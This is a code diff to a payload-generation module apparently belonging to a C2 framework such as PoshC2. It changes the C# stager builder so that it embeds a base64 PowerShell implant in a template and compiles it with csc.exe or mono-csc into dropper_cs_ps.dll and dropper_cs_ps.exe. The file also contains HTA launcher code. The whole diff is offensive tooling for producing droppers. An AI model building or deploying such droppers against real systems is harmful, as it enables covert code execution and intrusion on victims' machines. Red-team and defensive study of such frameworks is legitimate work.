@@ -1,4 +1,4 @@
-from Config import PayloadsDirectory, QuickCommand, FilesDirectory, DefaultMigrationProcess
+from Config import PayloadsDirectory, QuickCommand, FilesDirectory, DefaultMigrationProcess, POSHDIR
 from Colours import Colours
 from Utils import gen_key, randomuri, formStrMacro, formStr
 import gzip, base64, subprocess, os, hashlib
@@ -346,16 +346,27 @@ ao.run('%s', 0);window.close();
         output_file.write(hta)
         output_file.close()
 
-    def CreateCS(self):
+    def CreateCS(self, name=""):
         basefile = self.CreateRawBase()
         with open("%sSharp_Powershell_Runner.cs" % FilesDirectory, 'r') as f:
             content = f.read()
         cs = content.replace("#REPLACEME#", str(basefile))
-        self.QuickstartLog("CS Powershell Stager source written to: %sSharp_Posh_Stager.cs" % self.BaseDirectory)
-        filename = "%sSharp_Posh_Stager.cs" % (self.BaseDirectory)
+        self.QuickstartLog("CS Powershell Stager source written to: %s%sSharp_Posh_Stager.cs" % (self.BaseDirectory, name))
+        filename = "%s%sSharp_Posh_Stager.cs" % (self.BaseDirectory, name)
         output_file = open(filename, 'w')
         output_file.write(cs)
         output_file.close()
+        if os.name == 'nt':
+            compile = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -target:library -out:%s%sdropper_cs_ps.dll %s%sSharp_Posh_Stager.cs -reference:System.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name)
+            compileexe = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -target:exe -out:%s%sdropper_cs_ps.exe %s%sSharp_Posh_Stager.cs -reference:System.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name)
+        else:
+            compile = "mono-csc %s%sSharp_Posh_Stager.cs -out:%s%sdropper_cs_ps.dll -target:library -warn:2 /reference:%sFiles/System.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name, POSHDIR)
+            compileexe = "mono-csc %s%sSharp_Posh_Stager.cs -out:%s%sdropper_cs_ps.exe -target:exe -warn:2 /reference:%sFiles/System.Management.Automation.dll" % (self.BaseDirectory, name, self.BaseDirectory, name, POSHDIR)
+        subprocess.check_output(compile, shell=True)
+        self.QuickstartLog("C# Powershell DLL written to: %s%sdropper_cs_ps.dll" % (self.BaseDirectory, name))
+        subprocess.check_output(compileexe, shell=True)
+        self.QuickstartLog("C# Powershell EXE written to: %s%sdropper_cs_ps.exe" % (self.BaseDirectory, name))
+
 
     def CreatePython(self, name=""):
         self.QuickstartLog(Colours.END)
